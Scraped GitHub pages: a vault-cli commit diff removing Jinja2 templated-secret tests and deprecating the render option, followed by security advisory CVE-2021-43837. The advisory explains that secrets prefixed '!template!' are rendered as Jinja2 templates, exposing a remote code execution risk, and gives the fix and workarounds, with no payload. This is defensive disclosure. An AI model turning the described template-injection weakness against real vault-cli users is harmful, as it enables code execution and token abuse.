[tests/unit/test\_client\_base.py](#diff-572a3cd1b411fc1ddd203e80227b0b0ca9145815e85fe740128ba798c3e85111 "tests/unit/test_client_base.py")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/tests/unit/test_client_base.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,8 +1,6 @@ |
|  |  | import itertools |
|  |  |  |
|  |  | import pytest |
|  |  |  |
|  |  | from vault\_cli import client, exceptions, testing |
|  |  | from vault\_cli import client, exceptions |
|  |  |  |
|  |  |  |
|  |  | def test\_get\_client(mocker): |
| Expand Down  Expand Up | | @@ -476,44 +474,6 @@ def test\_vault\_client\_base\_render\_template\_path\_not\_found(vault, template): |
|  |  | ({"a": {"value": "b"}}, {"value": "b"}), |
|  |  | # Secret not a string |
|  |  | ({"a": {"value": ["yay"]}}, {"value": ["yay"]}), |
|  |  | # Secret is a template without variable expansion |
|  |  | ({"a": {"value": "!template!b"}, "b": {"value": "c"}}, {"value": "b"}), |
|  |  | # Secret is a template |
|  |  | ( |
|  |  | {"a": {"value": "!template!{{ vault('b').value }}"}, "b": {"value": "c"}}, |
|  |  | {"value": "c"}, |
|  |  | ), |
|  |  | # Secret is a dict with containing a template |
|  |  | ( |
|  |  | { |
|  |  | "a": {"x": "!template!{{ vault('b').value }}", "y": "yay"}, |
|  |  | "b": {"value": "c"}, |
|  |  | }, |
|  |  | {"x": "c", "y": "yay"}, |
|  |  | ), |
|  |  | # Finite recursion |
|  |  | ( |
|  |  | { |
|  |  | "a": {"value": "!template!{{ vault('b').value }}"}, |
|  |  | "b": {"value": "!template!{{ vault('c').value }}"}, |
|  |  | "c": {"value": "d"}, |
|  |  | }, |
|  |  | {"value": "d"}, |
|  |  | ), |
|  |  | # Infinite Recursion |
|  |  | ( |
|  |  | { |
|  |  | "a": {"value": "!template!{{ vault('b').value }}"}, |
|  |  | "b": {"value": "!template!{{ vault('c').value }}"}, |
|  |  | "c": {"value": "!template!{{ vault('a').value }}"}, |
|  |  | }, |
|  |  | {"value": '<recursive value "a">'}, |
|  |  | ), |
|  |  | # Direct Recursion |
|  |  | ( |
|  |  | {"a": {"value": "!template!{{ vault('a').value }}"}}, |
|  |  | {"value": '<recursive value "a">'}, |
|  |  | ), |
|  |  | ], |
|  |  | ) |
|  |  | def test\_vault\_client\_base\_get\_secret(vault, vault\_contents, expected): |
| Expand All | | @@ -522,23 +482,6 @@ def test\_vault\_client\_base\_get\_secret(vault, vault\_contents, expected): |
|  |  | assert vault.get\_secret("a") == expected |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_deprecation\_warning(vault, caplog): |
|  |  | vault.db = {"a": {"value": "!template!b"}} |
|  |  | caplog.set\_level("WARNING") |
|  |  |  |
|  |  | vault.get\_secret("a") |
|  |  | assert "Templated values are deprecated" in caplog.records[0].message |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_template\_root(vault): |
|  |  | vault.base\_path = "base" |
|  |  | vault.db = {"/base/a": {"value": '!template!{{ vault("a").value }} yay'}} |
|  |  |  |
|  |  | # In case of erroneous caching, e.g. a different cache entry |
|  |  | # for /base/a and base/a, we would find '<recursive value "a"> yay yay' |
|  |  | assert vault.get\_secret("/base/a") == {"value": '<recursive value "a"> yay'} |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_multiple\_keys(vault): |
|  |  | vault.db = {"rabbitmq/creds/role": {"username": "foo", "password": "bar"}} |
|  |  | assert vault.get\_secret("rabbitmq/creds/role") == { |
| Expand All | | @@ -547,22 +490,11 @@ def test\_vault\_client\_base\_get\_secret\_multiple\_keys(vault): |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_with\_dict(vault): |
|  |  | vault.db = { |
|  |  | "credentials": {"value": {"username": "foo", "password": "bar"}}, |
|  |  | "dsn": { |
|  |  | "value": "!template!proto://{{ vault('credentials')['value']['username'] }}:{{ vault('credentials').value.password }}@host" |
|  |  | }, |
|  |  | } |
|  |  |  |
|  |  | assert vault.get\_secret("dsn") == {"value": "proto://foo:bar@host"} |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_not\_found(vault): |
|  |  | vault.db = {} |
|  |  |  |
|  |  | with pytest.raises(exceptions.VaultSecretNotFound): |
|  |  | vault.get\_secret("not-exiting") |
|  |  | vault.get\_secret("not-existing") |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_missing\_key(vault): |
| Expand All | | @@ -572,20 +504,6 @@ def test\_vault\_client\_base\_get\_secret\_missing\_key(vault): |
|  |  | vault.get\_secret("a", key="username") |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_template\_error(vault, caplog): |
|  |  | vault.db = {"a": {"key": "!template!{{"}} |
|  |  |  |
|  |  | with pytest.raises(exceptions.VaultRenderTemplateError) as exc\_info: |
|  |  | vault.get\_secret("a") |
|  |  |  |
|  |  | assert str(exc\_info.value) == 'Error while rendering secret at path "a"' |
|  |  | assert ( |
|  |  | str(exc\_info.value.\_\_cause\_\_) |
|  |  | == 'Error while rendering secret value for key "key"' |
|  |  | ) |
|  |  | assert str(exc\_info.value.\_\_cause\_\_.\_\_cause\_\_) == "Jinja2 template syntax error" |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_lookup\_token(vault): |
|  |  | assert vault.lookup\_token() == {"data": {"expire\_time": "2100-01-01T00:00:00"}} |
|  |  |  |
| Expand Down  Expand Up | | @@ -672,56 +590,6 @@ def test\_vault\_client\_base\_get\_secret\_implicit\_cache(vault): |
|  |  | assert vault.get\_secret("a") == {"value": "b"} |
|  |  |  |
|  |  |  |
|  |  | class RaceConditionTestVaultClient(testing.TestVaultClient): |
|  |  | def \_\_init\_\_(self, \*args, \*\*kwargs): |
|  |  | super().\_\_init\_\_(\*args, \*\*kwargs) |
|  |  | self.counter = itertools.count() |
|  |  |  |
|  |  | def \_get\_secret(self, path): |
|  |  | if path == "a": |
|  |  | val = next(self.counter) |
|  |  | return {"b": f"b{val}", "c": f"c{val}"} |
|  |  | return super().\_get\_secret(path) |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_implicit\_cache\_no\_race\_condition(): |
|  |  | # In this test we check that if a value is read several times by |
|  |  | # a template, implicit caching makes sure we have the same value |
|  |  | # every time. |
|  |  |  |
|  |  | # Values returned by this client keep changing |
|  |  |  |
|  |  | vault = RaceConditionTestVaultClient() |
|  |  |  |
|  |  | with vault: |
|  |  | assert vault.get\_secret("a") == {"b": "b0", "c": "c0"} |
|  |  | with vault: |
|  |  | assert vault.get\_secret("a") == {"b": "b1", "c": "c1"} |
|  |  |  |
|  |  | vault.db = {"d": {"value": """!template!{{ vault("a").b }}-{{ vault("a").c }}"""}} |
|  |  |  |
|  |  | # b2-c3 would be the value if caching didn't work. |
|  |  | with vault: |
|  |  | assert vault.get\_secret("d") == {"value": "b2-c2"} |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secrets\_implicit\_cache\_no\_race\_condition(): |
|  |  | # In this test, the same value is read twice by get-all and template |
|  |  | # We check that 2 values are consistent |
|  |  |  |
|  |  | vault = RaceConditionTestVaultClient() |
|  |  |  |
|  |  | vault.db = { |
|  |  | "a": {}, |
|  |  | "d": {"value": """!template!{{ vault("a").b }}-{{ vault("a").c }}"""}, |
|  |  | } |
|  |  |  |
|  |  | assert vault.get\_secrets("") == { |
|  |  | "a": {"b": "b0", "c": "c0"}, |
|  |  | "d": {"value": "b0-c0"}, |
|  |  | } |
|  |  |  |
|  |  |  |
|  |  | def test\_vault\_client\_base\_get\_secret\_explicit\_cache(vault): |
|  |  | vault.db = {"a": {"value": "b"}} |
|  |  | with vault: |
| Expand Down | |  |

5 changes: 3 additions & 2 deletions

5
[vault\_cli/cli.py](#diff-f50a45ace6b8dcf2f312a7a52f93df81151abfdbc37d0ebbfe53c8415d820047 "vault_cli/cli.py")

Show comments

[View file](/peopledoc/vault-cli/blob/3ba3955887fd6b7d4d646c8b260f21cebf5db852/vault_cli/cli.py)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -133,8 +133,8 @@ def repr\_octal(value: Optional[int]) -> Optional[str]: |
|  |  | ) |
|  |  | @click.option( |
|  |  | "--render/--no-render", |
|  |  | default=settings.DEFAULTS.render, |
|  |  | help="Render templated values", |
|  |  | default=False, |
|  |  | help="Deprecated / unused", |
|  |  | ) |
|  |  | @click.option( |
|  |  | "--umask", |
| Expand Down  Expand Up | | @@ -174,6 +174,7 @@ def cli(ctx: click.Context, verbose: int, umask: int, \*\*kwargs) -> None: |
|  |  | (including VAULT\_CLI\_PASSWORD and VAULT\_CLI\_TOKEN). |
|  |  |  |
|  |  | """ |
|  |  | kwargs.pop("render") |
|  |  | kwargs.pop("config\_file") |
|  |  | set\_verbosity(verbose) |
|  |  | set\_umask(umask) |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `3ba3955`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeopledoc%2Fvault-cli%2Fcommit%2F3ba3955887fd6b7d4d646c8b260f21cebf5db852) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_3196a052_20250114_232416.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeopledoc%2Fvault-cli%2Fsecurity%2Fadvisories%2FGHSA-q34h-97wf-8r8j)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fpeopledoc%2Fvault-cli%2Fsecurity%2Fadvisories%2FGHSA-q34h-97wf-8r8j)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=peopledoc%2Fvault-cli)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[peopledoc](/peopledoc)
/
**[vault-cli](/peopledoc/vault-cli)**
Public

* [Notifications](/login?return_to=%2Fpeopledoc%2Fvault-cli) You must be signed in to change notification settings
* [Fork
  22](/login?return_to=%2Fpeopledoc%2Fvault-cli)
* [Star
   82](/login?return_to=%2Fpeopledoc%2Fvault-cli)

* [Code](/peopledoc/vault-cli)
* [Issues
  12](/peopledoc/vault-cli/issues)
* [Pull requests
  1](/peopledoc/vault-cli/pulls)
* [Actions](/peopledoc/vault-cli/actions)
* [Projects
  0](/peopledoc/vault-cli/projects)
* [Security](/peopledoc/vault-cli/security)
* [Insights](/peopledoc/vault-cli/pulse)

Additional navigation options

* [Code](/peopledoc/vault-cli)
* [Issues](/peopledoc/vault-cli/issues)
* [Pull requests](/peopledoc/vault-cli/pulls)
* [Actions](/peopledoc/vault-cli/actions)
* [Projects](/peopledoc/vault-cli/projects)
* [Security](/peopledoc/vault-cli/security)
* [Insights](/peopledoc/vault-cli/pulse)

# vault-cli: possible RCE when reading user-defined data

High

[ewjoachim](/ewjoachim)
published
GHSA-q34h-97wf-8r8j
Dec 16, 2021

## Package

pip

vault-cli
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>=0.7.0,<3.0.0

## Patched versions

3.0.0

## Description

### Impact

*What kind of vulnerability is it? Who is impacted?*

vault-cli features the ability for rendering templated values (as explained in the [documentation](https://github.com/peopledoc/vault-cli/blob/2.2.1/docs/howto/templated_secrets.rst)). When a secret starts with the prefix `!template!`, vault-cli interprets the rest of the contents of the secret as a Jinja2 template.

Jinja2 is a powerful templating engine and it's not designed to safely render arbitrary templates. An attacker controlling a jinja2 template rendered on a machine can trigger arbitrary code, making this a Remote Code Execution (RCE) risk.

If the content of the vault can be completely trusted, then this is not a problem. Otherwise, if your threat model includes cases where an attacker can manipulate a secret value read from the vault using vault-cli, then this vulnerability may impact you.

This does not impact `vault` itself, except for the fact that the attacker, having an RCE on the machine that executes `vault-cli`, may abuse the token that `vault-cli` uses, to read, write or delete other data from the vault.

### Patches

*Has the problem been patched? What versions should users upgrade to?*

In 3.0.0, the code related to interpreting vault templated secrets has been removed entirely.

### Workarounds

*Is there a way for users to fix or remediate the vulnerability without upgrading?*

Using the environment variable `VAULT_CLI_RENDER=false` or the flag `--no-render` (placed between `vault-cli` and the subcommand, e.g. `vault-cli --no-render get-all`) or adding `render: false` to the vault-cli configuration yaml file disables rendering and removes the vulnerability.

Using the python library, you can use: `vault_cli.get_client(render=False)` when creating your client to get a client that will not render templated secrets and thus operates securely.

### References

*Are there any links users can visit to find out more?*

Here's an article explaining how jinja2 templates might be exploited to have side effects: <https://podalirius.net/en/publications/grehack-2021-optimizing-ssti-payloads-for-jinja2/>

### For more information

If you have any questions or comments about this advisory:

* Open an issue in [the vault-cli repo](https://github.com/peopledoc/vault-cli/issues/new)

### Severity

High

8.5

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Adjacent

Attack complexity
Low

Privileges required
High

User interaction
None

Scope
Changed

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H

### CVE ID

CVE-2021-43837

### Weaknesses

No CWEs

### Credits

* [![@ewjoachim](https://avatars.githubusercontent.com/u/1457576?s=40&v=4)](/ewjoachim)
  [ewjoachim](/ewjoachim)
  Analyst

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


